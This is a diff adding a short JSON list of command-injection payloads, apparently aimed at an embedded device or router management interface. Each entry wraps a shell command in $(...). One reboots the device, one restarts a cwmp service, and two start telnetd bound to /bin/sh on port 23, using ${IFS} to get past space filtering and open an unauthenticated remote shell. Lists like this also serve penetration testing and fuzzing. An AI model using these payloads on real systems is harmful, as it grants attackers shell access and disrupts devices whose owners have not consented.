@@ -1,0 +1,20 @@
+{
+  "payloads": [
+    {
+      "payload": "$(reboot)",
+      "description": "reboot device injection"
+    },
+    {
+      "payload": "Aa1$(telnetd${IFS}-l${IFS}/bin/sh${IFS}-p${IFS}23)",
+      "description": "telnet enable injection"
+    },
+    {
+      "payload": "Aa1$(/usr/sbin/telnetd${IFS}-l${IFS}/bin/sh${IFS}-p${IFS}23)",
+      "description": "telnet enable injection 2"
+    },
+    {
+      "payload": "$(systemctl restart wdl-cwmp)",
+      "description": "restarts cwmp"
+    }
+  ]
+}
